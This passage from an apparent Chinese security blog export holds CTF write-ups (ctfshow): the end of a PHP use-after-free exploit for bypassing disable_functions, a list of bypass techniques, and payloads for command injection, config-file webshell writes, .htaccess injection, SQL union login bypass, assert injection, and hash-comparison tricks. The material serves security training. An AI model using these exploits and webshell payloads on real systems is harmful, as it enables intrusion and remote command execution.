0x30);    i2s($s -&gt; current(), 0x20, $system_address);    i2s($a, 0x00, $closure_object);    i2s($a, 0x08, 0x108, 7);    echo &quot;[+]Executing command: \n&quot;;    ($s -&gt; current())(&quot;php -v&quot;);&#125;function canRead($maps, &amp;$a) &#123;    global $s;    if (!$chunkAddress = getPHPChunk($maps)) &#123;        die(&quot;[!]Get PHP Chunk Address Failed&quot;);    &#125;    i2s($a, 0x08, 0x06, 7);    if (!$elementAddress = getElement($a, $chunkAddress)) &#123;        die(&quot;[!]Get SplDoublyLinkedList Element Address Failed&quot;);    &#125;    bypass($elementAddress, $a);&#125;function cantRead(&amp;$a) &#123;    global $s;    i2s($a, 0x08, 0x06, 7);    if (!isset($_GET[&quot;test1&quot;]) &amp;&amp; !isset($_GET[&quot;test2&quot;])) &#123;        die(&quot;[!]Please try to get address of PHP Chunk&quot;);    &#125;    if (isset($_GET[&quot;test1&quot;])) &#123;        die(dechex(bomb1($a)));    &#125;    if (isset($_GET[&quot;test2&quot;])) &#123;        $elementAddress = bomb2($a);    &#125;    if (!$elementAddress) &#123;        die(&quot;[!]Get SplDoublyLinkedList Element Address Failed&quot;);    &#125;    bypass($elementAddress, $a);&#125;$s = new SplDoublyLinkedList();$s -&gt; push(new Trigger());$s -&gt; push(&quot;Twings&quot;);$s -&gt; push(function($x)&#123;&#125;);for ($x = 0;$x &lt; 0x100;$x++) &#123;    $s -&gt; push(0x1234567812345678);&#125;$s -&gt; rewind();unset($s[0]);

包含该php即可执行命令(141行)
总结
大部分绕过方法在蚁剑中都有插件可以自动利用

绕过disable_functions的方法大致可以分为以下几类
1：寻找未禁用的函数
2：攻击后端组件：Apache_mod_cgi；ImageMagick；Bash Shellshock；
3：利用php的扩展：制作恶意php扩展；php74_FFI；windows com；imap_open()；
4：利用环境变量或者so文件：LD_PRELOAD；php-fpm；iconv；
5：pwn：写shellcode劫持got表；php7_GC_UAF；JSON_Serializer_UAF；php7_Backtrace_UAF；php_Concat_UAF；php7_UserFilter；php7_ReflectionProperty_UAF；php7_SplDoublyLinkedList UAF；
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>php</tag>
        <tag>bypass</tag>
        <tag>disable_functions</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】web入门-嵌入式</title>
    <url>/posts/dc70584a/</url>
    <content><![CDATA[环境模拟搭建：Nginx支持web界面执行bash|python等系统命令和脚本
web461#!/bin/bash  OIFS=&quot;$IFS&quot;  IFS=&quot;,&quot;  set $QUERY_STRING  Args=($QUERY_STRING)  IFS=&quot;$OIFS&quot;  if [ &quot;$&#123;Args[2]&#125;&quot;ctf = &quot;admin&quot;ctf ]; then          echo &quot;`$&#123;Args[0]&#125;$IFS$&#123;Args[1]&#125;`&quot;  fiexit 0

以逗号分割值，第三个值等于admin即可rce
?cat,/flag,admin
web462#!/bin/bash OIFS=&quot;$IFS&quot;  IFS=&quot;,&quot;  set $QUERY_STRING  Args=($QUERY_STRING)  IFS=&quot;$OIFS&quot;  if [ &quot;$&#123;Args[0]&#125;&quot;ctf = &quot;ping&quot;ctf ]; then          addr=&quot;`echo $&#123;Args[1]&#125; | sed &#x27;s|[\]||g&#x27; | sed &#x27;s|%20| |g&#x27;`&quot;          addr=&quot;ping -c 1 &quot;$addr          $addr  fi

与上一题差不多，多了两个过滤
不过测试后发现不出网。。做不出来
https://www.reddit.com/r/securityCTF/comments/15stmxp/a_problem_about_linux_bashcgi_command_injection/?rdt=42831
web463#include &lt;stdlib.h&gt;#include &quot;fcgi_stdio.h&quot;#include &lt;cstring&gt;/* just get lastest info */int _System(const char * cmd, char *pRetMsg, int msg_len)&#123;	FILE * fp;	char * p = NULL;	int res = -1;	if (cmd == NULL || pRetMsg == NULL || msg_len &lt; 0)	&#123;		printf(&quot;Param Error!\n&quot;);		return -1;	&#125;	if ((fp = popen(cmd, &quot;r&quot;) ) == NULL)	&#123;		printf(&quot;Popen Error!\n&quot;);		return -2;	&#125;	else	&#123;		memset(pRetMsg, 0, msg_len);		//get lastest result		while(fgets(pRetMsg, msg_len, fp) != NULL)		&#123;			printf(&quot;Msg:%s&quot;,pRetMsg); //print all info		&#125;		if ( (res = pclose(fp)) == -1)		&#123;			printf(&quot;close popenerror!\n&quot;);			return -3;		&#125;		pRetMsg[strlen(pRetMsg)-1] = &#x27;\0&#x27;;		return 0;	&#125;&#125;int main(void)&#123;    int count = 0;    char *cmd = &quot;&quot;;    char a8Result[128] = &#123;0&#125;;    int ret = 0;    while (FCGI_Accept() &gt;= 0)        printf(&quot;Content-type: text/html\r\n&quot;        &quot;\r\n&quot;        &quot;&lt;title&gt;CTFshow&lt;/title&gt;&quot;        &quot;&lt;h1&gt;where is flag?&lt;/h1&gt;&quot;        );        cmd=getenv(&quot;QUERY_STRING&quot;);	ret  = _System(cmd, a8Result, sizeof(a8Result));        printf(&quot;ret = %d \nresult = %s\nlength = %d \n&quot;, ret, a8Result, strlen(a8Result));    return 0;&#125;

可以直接执行命令
?cat$IFS/flag
web464#include &lt;stdlib.h&gt;#include &quot;fcgi_stdio.h&quot;#include &lt;cstring&gt;/* just get lastest info */int _System(const char * cmd, char *pRetMsg, int msg_len)&#123;	FILE * fp;	char * p = NULL;	int res = -1;	if (cmd == NULL || pRetMsg == NULL || msg_len &lt; 0)	&#123;		printf(&quot;Param Error!\n&quot;);		return -1;	&#125;	if ((fp = popen(cmd, &quot;r&quot;) ) == NULL)	&#123;		printf(&quot;Popen Error!\n&quot;);		return -2;	&#125;	else	&#123;		memset(pRetMsg, 0, msg_len);		//get lastest result		while(fgets(pRetMsg, msg_len, fp) != NULL)		&#123;			printf(&quot;Msg:%s&quot;,pRetMsg); //print all info		&#125;		if ( (res = pclose(fp)) == -1)		&#123;			printf(&quot;close popenerror!\n&quot;);			return -3;		&#125;		pRetMsg[strlen(pRetMsg)-1] = &#x27;\0&#x27;;		return 0;	&#125;&#125;int main(void)&#123;    int count = 0;    char *cmd = &quot;&quot;;    char a8Result[128] = &#123;0&#125;;    int ret = 0;    while (FCGI_Accept() &gt;= 0)        printf(&quot;Content-type: text/html\r\n&quot;        &quot;\r\n&quot;        &quot;&lt;title&gt;CTFshow&lt;/title&gt;&quot;        &quot;&lt;h1&gt;where is flag?&lt;/h1&gt;&quot;        );        cmd=getenv(&quot;QUERY_STRING&quot;);	ret  = _System(cmd, a8Result, sizeof(a8Result));    return 0;&#125;

与上一题相比少了输出，但是没什么区别
?cat$IFS/flag
web465给了编译好的cgi文件
逆向发现在main中没有直接调用_System，猜测需要溢出到_System然后就可以执行命令
不过地址不确定，暂时做不出来
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctfshow-web入门</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】web入门-大赛原题</title>
    <url>/posts/bb1e6cfa/</url>
    <content><![CDATA[做一题更新一题吧
WEB692绕过addslashes并写入文件配置getshell题目代码
&lt;?phphighlight_file(__FILE__);if(!isset($_GET[&#x27;option&#x27;])) die();$str = addslashes($_GET[&#x27;option&#x27;]);$file = file_get_contents(&#x27;./config.php&#x27;);$file = preg_replace(&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;, &quot;\$option=&#x27;$str&#x27;;&quot;, $file);file_put_contents(&#x27;./config.php&#x27;, $file);

首先看一下addslashes() 函数的作用：addslashes() 函数会将预定义的字符前添加反斜杠字符串预定义字符有单引号，双引号，反斜杠，NULL四个效果如图，会添加上\
所以当我们传入?option=a\&#39;;phpinfo();//时会变为a\\\&#39;;phpinfo();//
接着看preg_replace函数preg_replace($pattern, $replacement, $string);搜索string中匹配pattern的部分，以replacement进行替换。
最终config.php的内容为
&lt;?php$option=&#x27;a\\&#x27;;phpinfo();//&#x27;;
这样就构造了一个phpinfo();
所以直接上传php马?option=a\&#39;;eval($_POST[a]);//

WEB701出自HarekazeCTF2019-A_Z源码
const express = require(&#x27;express&#x27;);const path = require(&#x27;path&#x27;);const vm = require(&#x27;vm&#x27;);const app = express();app.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;));app.set(&#x27;view engine&#x27;, &#x27;pug&#x27;);app.use(express.static(path.join(__dirname, &#x27;public&#x27;)));app.get(&#x27;/&#x27;, function (req, res, next) &#123;  let output = &#x27;&#x27;;  const code = req.query.code + &#x27;&#x27;;  if (code &amp;&amp; code.length &lt; 200 &amp;&amp; !/[^a-z().]/.test(code)) &#123;    try &#123;      const result = vm.runInNewContext(code, &#123;&#125;, &#123; timeout: 500 &#125;);      if (result === 1337) &#123;        output = process.env.FLAG;      &#125; else &#123;        output = &#x27;nope&#x27;;      &#125;    &#125; catch (e) &#123;      output = &#x27;nope&#x27;;    &#125;  &#125; else &#123;    output = &#x27;nope&#x27;;  &#125;  res.render(&#x27;index&#x27;, &#123; title: &#x27;[a-z().]&#x27;, output &#125;);&#125;);app.get(&#x27;/source&#x27;, function (req, res) &#123;  res.sendFile(path.join(__dirname, &#x27;app.js&#x27;));&#125;);module.exports = app;
我们只能使用[a-z().]这些字符构造出1337
if (result === 1337) &#123;        output = process.env.FLAG;      &#125;

我们可以用(typeof(this)).constructor()构造出空字符串，而JS中1&#x3D;&#x3D;true，所以(typeof(this)).constructor().length.constructor(true)就会构造出1，或者true.constructor.length。3可以用字符串的big()方法的name.length获得，7可以用true.constructor.name.length得到。最后将所有字符concat在一起即可。
所以最后Payload（不唯一）：eval((typeof(this)).constructor().concat(true.constructor.length).concat((typeof(this)).big.name.length).concat((typeof(this)).big.name.length).concat(true.constructor.name.length))
WEB712出自XNUCA 2019 EasyPHP
题目给了源码
&lt;?php    $files = scandir(&#x27;./&#x27;);    foreach($files as $file) &#123;        if(is_file($file))&#123;            if ($file !== &quot;index.php&quot;) &#123;                unlink($file);            &#125;        &#125;    &#125;    include_once(&quot;fl3g.php&quot;);    if(!isset($_GET[&#x27;content&#x27;]) || !isset($_GET[&#x27;filename&#x27;])) &#123;        highlight_file(__FILE__);        die();    &#125;    $content = $_GET[&#x27;content&#x27;];    if(stristr($content,&#x27;on&#x27;) || stristr($content,&#x27;html&#x27;) || stristr($content,&#x27;type&#x27;) || stristr($content,&#x27;flag&#x27;) || stristr($content,&#x27;upload&#x27;) || stristr($content,&#x27;file&#x27;)) &#123;        echo &quot;Hacker&quot;;        die();    &#125;    $filename = $_GET[&#x27;filename&#x27;];    if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) !== 0) &#123;        echo &quot;Hacker&quot;;        die();    &#125;    $files = scandir(&#x27;./&#x27;);    foreach($files as $file) &#123;        if(is_file($file))&#123;            if ($file !== &quot;index.php&quot;) &#123;                unlink($file);            &#125;        &#125;    &#125;    file_put_contents($filename, $content . &quot;\nJust one chance&quot;);?&gt;
2-9,25-32行的意思是删除除了文件名是index.php的文件10行包含了fl3g.php文件16-19对content参数，也就是文件内容进行了关键词过滤21-24对filename参数进行了正则过滤，使文件名只允许出现a-z和点
分析完后发现好像对我们写shell没什么影响。。传完后发现不能解析，应该是出题的时候设置了只能解析index.php
这个时候想到了之前做文件上传时经常用到的.htaccess，直接设置AddType或者SetHandler不就行了吗,但是回过去看那些看似无用的关键词过滤，实际上把这两种情况禁用了
而且内容中还拼接了Just one chance,在.htaccess中会报错，所以要把它注释掉，先利用\拼接上下两行，再用#注释
既然可以用\，那么也就可以绕过过滤了，从而写入被限制的内容
@autor: Iv4nimport requestsurl = &#x27;http://f47cd164-0248-4cca-993d-8610c32a4aa1.challenge.ctf.show/&#x27;r = requests.get(url+&#x27;?filename=.htaccess&amp;content=php_value%20auto_prepend_fi\%0Ale%20&quot;.htaccess&quot;%0AErrorDocument%20404%20&quot;&lt;?php%20system(\&#x27;cat%20../../../fl[a]g\&#x27;);?&gt;\\&#x27;)print(r.text)

php_value auto_prepend_file将自身加载到index.php，然后写一句话木马，直接写的话会导致500，所以通过ErrorDocument 404

WEB720sha1的强比较
&lt;?phperror_reporting(0);include &quot;flag.php&quot;;if (isset($_GET[&#x27;name&#x27;]) and isset($_GET[&#x27;password&#x27;])) &#123;    if ($_GET[&#x27;name&#x27;] == $_GET[&#x27;password&#x27;])        echo &#x27;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#x27;;    else if (sha1($_GET[&#x27;name&#x27;]) === sha1($_GET[&#x27;password&#x27;]))      die(&#x27;Flag: &#x27;.$flag);    else        echo &#x27;&lt;p&gt;Invalid password.&lt;/p&gt;&#x27;;&#125;else&#123;    highlight_file(__FILE__);&#125;
找到两个sha1后相等的值即可
?name=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;password=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1

WEB721F12看源码
&lt;!-- CTFSHOW hint:      if (($row[pass]) &amp;&amp; (!strcasecmp(md5($pass), $row[pass]))) &#123;              echo &quot;&lt;p&gt;Logged in! &quot;.$flag.&quot; &lt;/p&gt;&quot;;        &#125;--&gt;

从数据库中提取出pass 然后逻辑与 与右边的(!strcasecmp($pass, $row[pass])) 两条语句都为真才会打印出flag
构造一个联合查询:这样第一条语句查询a这个用户查不到,然后第二个根据特性会返回这个结果到password字段下
payload：
username:a&#x27; union select md5(1)#password:1

WEB726F12看源码跟WEB692一样，是Php写入配置文件的经典漏洞
&lt;!-- CTFSHOW hint:        $file = file_get_contents(&#x27;config.php&#x27;);        $file = preg_replace(&#x27;|\$db=\&#x27;.*\&#x27;;|&#x27;, &quot;\$db=&#x27;$username&#x27;;&quot;, $file);        file_put_contents(&#x27;config.php&#x27;, $file);--&gt;

但是用692的方法做不出来，这里用其他方法（利用 preg_replace() 函数的第二个参数的问题）
我们首先传入username=;eval($_POST[1]);
这时，config.php文件中的内容为
&lt;?php$option=&#x27;;phpinfo();&#x27;;

因为在preg_replace函数中\\0和$0代表完整的模式匹配文本
所以当我们传入username=$0后config.php的内容就变成了
&lt;?php$db=&#x27;$db=&#x27;;eval($_POST[1]);&#x27;;&#x27;;
两个单引号刚好闭合上，成功构造出eval函数
访问config.php，传入1=system(&#39;tac flag.php&#39;);,拿到flag
WEB728F12看源码
&lt;!-- CTFSHOW hint:        $file = &quot;templates/&quot; . $page . &quot;.php&quot;;            //将page变量拼接成一个templates下的php文件，设置为变量file        assert(&quot;strpos(&#x27;$file&#x27;, &#x27;..&#x27;) === false&quot;) or die(&quot;hack!&quot;);            //判断file中是否有&quot; .. &quot;，如果有则直接退出--&gt;
利用&#39;)闭合，并使用//注释后面的内容，以执行我们的命令
payload：1&#39;) or system(&#39;tac ./templates/flag.php&#39;);//
WEB729F12看到代码
&lt;!-- CTFSHOW hint:              $flag_input = $_POST[&#x27;flag&#x27;];              if((strcmp(flag_input,$flag)))              &#123;                die(&quot;flag不正确&quot;);              &#125;              $_p = 6543;              $_l = 21;              $l = strlen($_GET[&#x27;secret&#x27;]);              $_i = intval($_GET[&#x27;secret&#x27;]);              if($l !== $_l || $_i !== $_p)              &#123;                die(&quot;系统异常&quot;);              &#125;              echo &quot;&lt; !--$flag-- &gt;&quot;;--&gt;
我们需要过两个if的判断
第一个if：strcmp()函数的作用是比较两个字符串，相同则为0。因为strcmp函数无法比较数组，会返回0，将flag输入为数组即可绕过。
第二个if：要满足两个条件，长度为21，整数值为6534
综上所述，构造的payload为
POST /?secret=6543aaaaaaaaaaaaaaaaaflag[]=1

WEB731F12看到hint一个sha1的弱比较传入一个0e开头的值即可
&lt;!-- CTFSHOW hint:              $hash = sha1($_GET[&#x27;hash&#x27;]);              $target = sha1(10932435112);              if($hash == $target) &#123;                  include(&#x27;flag.php&#x27;);                  print $flag;              &#125;--&gt;
参考值
aaroZmOk:0e66507019969427134894567494305185566735aaK1STfY:0e76658526655756207688271159624026011393aaO8zKZF:0e89257456677279068558073954252716165668aa3OFF9m:0e36977786278517984959260394024281014729w9KASOk6Ikap:0e94685489941557404937568181716894429726CZbnUtm/wD+0:00e6513589156647795423839906410117726741RSnake33ncxYMsiIgw:00e0446570916533934353629798824448898569hashcatRhtkuysFOYYh:0ec6007027368764166354656983137779429045hashcat7YfJg9x6AqNA:0e50220802416020462770479580634172053582hashcatJbYtCyUf7I3K:00e9121985231400931761319208500866143806hashcatZJCFhv5hhkxM:0e22622630708604282251577618083953362629hashcat7gqQ5KzDJRDe:0e89084512868781863087376038568650856166hashcatU4BRJMv0wZQ9:0e26648206422262155598429612413699840868hashcat6gP5u3LfjkB4:00e4745251895202147342658062640046218324hashcatGqnE8xnyDXTf:0e15969028436788874806413050149455726924hashcatirBCZWadC4V6:0e31649851810187193299309281808938075168hashcat0vScS1X5pWWD:00e8504108085943725027274200432213595492hashcat46AOYaAyyXRm:0e12074483623118174676713113381129899097hashcatHArOfcXelAhD:00e4559098389903496918609646734123833089hashcatQH5Q477JNSPy:0e55688066453591945830139349969019185986hashcatw1ZBfRtYm5oM:0e05033562275990914578610618694299895931hashcatoSz6YKuiFR3Y:0ee0160094252962728385313526058227602671hashcatypQJbFRa1dZt:0e55105030693666790285044072061907048558hashcatFN2n52JGTFx5:0e448836342008124394987495855019229166360e00000000000000000000081614617300000000:0e653075259409996322874922854682592190700e00000000000000000000721902017120000000:0e949811594982522954181824538411404832740e01011001101011010001101110101100101000:0e489065231519767511176774637871111065980e11001000001010011000100000010001101000:0e634071849609304190270627777050813794520e01000001100000001010011011001000000100:0e559620723883970838143467337186982137960e10011110000101101000011101011010100100:0e311885854172858287853553367742377127920e01010111000111111010101011010111010100:0e459063445696166594288088920912619691810e00100001110000001111010000010011101100:0e148602586690523325495686077104381329530e11110000111010001001101111111110010010:0e121742584363857585528744269416865384830e10111110011100101100010101111010000110:0e997743982825933760434620385722813853890e11001111110111110010111010000011110110:0e631852213010346249403454710743578887970e00001010010101100100101011101110001110:0e909439887721717490544135938881059867820e01011101110010111011110010010010101110:0e016088001926598035767713466074417378260e10111110101111001000000100011101101110:0e490945414584794952630342944210251869380e11100111101110011010111001010101111110:0e557707061499487600862007135058418875430e11111001010101100110011001010001110001:0e911206871211638095158241354350299581370e01000111101111110010010010000001001001:0e780717973285463693018254208488724518490e00100110100010100110001101110110110101:0e060773804082606146592199205610827676320e11111100001011000011110100100010111101:0e121491203544153352207583994927139215880e00111100110101101001000101011011111101:0e386611265697905555984319050654038705160e10100011100101000001110010100110100011:0e557450781546402125115962590559102780700e10011110011111001001100100000111011011:0e20319731123101477913295720812414482217&amp;O&amp;GKtn&amp;54xQ:00e8144605926111857621787045161777776795Sk~HOM&amp;QzJXl:00e89430833233739910145995975669841823871023456852390915:0e26379374770352024666148968868586665768lowercasegzmgqmx:0e46257280787231943618306073689855362607lowercasifdvqkfr:0e11372668415308535558155136274413213182lowercasebchqcwctky:0e63270019212961791900055698786302314274lowercaseabcsobpkrt:0e54706107047262165256262457226759421225UPPERCASFFLIIQWR:00e0209539108131630074694125235505223102MixedCaseERWqTVQ:0e26765837881628507475765845815158037783MixCaseDigJiRR9d:00e6970695351422324349039381794949865825Punc!0&quot;*!&quot;#$8!zv:0e77726009946581613829608157794165640009Punctu!U&quot;F5ru:0e10005769841271999406141555258742283712Punctuatiow$&#x27;l9X:0e16039695246683143323677708220808911326Punctuati0t..jsI:0e77237948969014118794910091659528041921

WEB732F12得到hint:password.js
&lt;!-- CTFSHOW hint:              password.js--&gt;

访问后发现是被混淆过的js代码
var _0x575c=[&#x27;\x32\x2d\x34&#x27;,&#x27;\x73\x75\x62\x73\x74\x72\x69\x6e\x67&#x27;,&#x27;\x34\x2d\x37&#x27;,&#x27;\x67\x65\x74\x49\x74\x65\x6d&#x27;,&#x27;\x64\x65\x6c\x65\x74\x65\x49\x74\x65\x6d&#x27;,&#x27;\x31\x32\x2d\x31\x34&#x27;,&#x27;\x30\x2d\x32&#x27;,&#x27;\x73\x65\x74\x49\x74\x65\x6d&#x27;,&#x27;\x39\x2d\x31\x32&#x27;,&#x27;\x5e\x37\x4d&#x27;,&#x27;\x75\x70\x64\x61\x74\x65\x49\x74\x65\x6d&#x27;,&#x27;\x62\x62\x3d&#x27;,&#x27;\x37\x2d\x39&#x27;,&#x27;\x31\x34\x2d\x31\x36&#x27;,&#x27;\x6c\x6f\x63\x61\x6c\x53\x74\x6f\x72\x61\x67\x65&#x27;,];(function(_0x4f0aae,_0x575cf8)&#123;var _0x51eea2=function(_0x180eeb)&#123;while(--_0x180eeb)&#123;_0x4f0aae[&#x27;push&#x27;](_0x4f0aae[&#x27;shift&#x27;]());&#125;&#125;;_0x51eea2(++_0x575cf8);&#125;(_0x575c,0x78));var _0x51ee=function(_0x4f0aae,_0x575cf8)&#123;_0x4f0aae=_0x4f0aae-0x0;var _0x51eea2=_0x575c[_0x4f0aae];return _0x51eea2;&#125;;function CheckPassword(_0x47df21)&#123;var _0x4bbdc3=[_0x51ee(&#x27;0xe&#x27;),_0x51ee(&#x27;0x3&#x27;),_0x51ee(&#x27;0x7&#x27;),_0x51ee(&#x27;0x4&#x27;),_0x51ee(&#x27;0xa&#x27;)];window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](&#x27;9-12&#x27;,&#x27;BE*&#x27;);window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee(&#x27;0x2&#x27;),_0x51ee(&#x27;0xb&#x27;));window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee(&#x27;0x6&#x27;),&#x27;5W&#x27;);window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](&#x27;16&#x27;,_0x51ee(&#x27;0x9&#x27;));window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee(&#x27;0x5&#x27;),&#x27;pg&#x27;);window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](&#x27;7-9&#x27;,&#x27;+n&#x27;);window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee(&#x27;0xd&#x27;),&#x27;4t&#x27;);window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee(&#x27;0x0&#x27;),&#x27;$F&#x27;);if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0x8&#x27;))===_0x47df21[_0x51ee(&#x27;0x1&#x27;)](0x9,0xc))&#123;if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0x2&#x27;))===_0x47df21[&#x27;substring&#x27;](0x4,0x7))&#123;if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0x6&#x27;))===_0x47df21[_0x51ee(&#x27;0x1&#x27;)](0x0,0x2))&#123;if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](&#x27;16&#x27;)===_0x47df21[_0x51ee(&#x27;0x1&#x27;)](0x10))&#123;if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0x5&#x27;))===_0x47df21[_0x51ee(&#x27;0x1&#x27;)](0xc,0xe))&#123;if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0xc&#x27;))===_0x47df21[_0x51ee(&#x27;0x1&#x27;)](0x7,0x9))&#123;if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0xd&#x27;))===_0x47df21[_0x51ee(&#x27;0x1&#x27;)](0xe,0x10))&#123;if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0x0&#x27;))===_0x47df21[_0x51ee(&#x27;0x1&#x27;)](0x2,0x4))return!![];&#125;&#125;&#125;&#125;&#125;&#125;&#125;return![];&#125;

在线解密后js代码：
var _0x575c = [&#x27;2-4&#x27;, &#x27;substring&#x27;, &#x27;4-7&#x27;, &#x27;getItem&#x27;, &#x27;deleteItem&#x27;, &#x27;12-14&#x27;, &#x27;0-2&#x27;, &#x27;setItem&#x27;, &#x27;9-12&#x27;, &#x27;^7M&#x27;, &#x27;updateItem&#x27;, &#x27;bb=&#x27;, &#x27;7-9&#x27;, &#x27;14-16&#x27;, &#x27;localStorage&#x27;, ];(function(_0x4f0aae, _0x575cf8) &#123;    var _0x51eea2 = function(_0x180eeb) &#123;        while (--_0x180eeb) &#123;            _0x4f0aae[&#x27;push&#x27;](_0x4f0aae[&#x27;shift&#x27;]());        &#125;    &#125;;    _0x51eea2(++_0x575cf8);&#125;(_0x575c, 0x78));var _0x51ee = function(_0x4f0aae, _0x575cf8) &#123;    _0x4f0aae = _0x4f0aae - 0x0;    var _0x51eea2 = _0x575c[_0x4f0aae];    return _0x51eea2;&#125;;function CheckPassword(_0x47df21) &#123;    var _0x4bbdc3 = [_0x51ee(&#x27;0xe&#x27;), _0x51ee(&#x27;0x3&#x27;), _0x51ee(&#x27;0x7&#x27;), _0x51ee(&#x27;0x4&#x27;), _0x51ee(&#x27;0xa&#x27;)];    window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](&#x27;9-12&#x27;, &#x27;BE*&#x27;);    window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee(&#x27;0x2&#x27;), _0x51ee(&#x27;0xb&#x27;));    window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee(&#x27;0x6&#x27;), &#x27;5W&#x27;);    window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](&#x27;16&#x27;, _0x51ee(&#x27;0x9&#x27;));    window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee(&#x27;0x5&#x27;), &#x27;pg&#x27;);    window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](&#x27;7-9&#x27;, &#x27;+n&#x27;);    window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee(&#x27;0xd&#x27;), &#x27;4t&#x27;);    window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee(&#x27;0x0&#x27;), &#x27;$F&#x27;);    if (window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0x8&#x27;)) === _0x47df21[_0x51ee(&#x27;0x1&#x27;)](0x9, 0xc)) &#123;        if (window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0x2&#x27;)) === _0x47df21[&#x27;substring&#x27;](0x4, 0x7)) &#123;            if (window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0x6&#x27;)) === _0x47df21[_0x51ee(&#x27;0x1&#x27;)](0x0, 0x2)) &#123;                if (window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](&#x27;16&#x27;) === _0x47df21[_0x51ee(&#x27;0x1&#x27;)](0x10)) &#123;                    if (window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0x5&#x27;)) === _0x47df21[_0x51ee(&#x27;0x1&#x27;)](0xc, 0xe)) &#123;                        if (window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0xc&#x27;)) === _0x47df21[_0x51ee(&#x27;0x1&#x27;)](0x7, 0x9)) &#123;                            if (window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0xd&#x27;)) === _0x47df21[_0x51ee(&#x27;0x1&#x27;)](0xe, 0x10)) &#123;                                if (window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0x0&#x27;)) === _0x47df21[_0x51ee(&#x27;0x1&#x27;)](0x2, 0x4)) return !![];                            &#125;                        &#125;                    &#125;                &#125;            &#125;        &#125;    &#125;    return ![];&#125;


可以看到密码被拆分成很多部分，且顺序被打乱了，但是元素赋值和检查密码的顺序是一样的
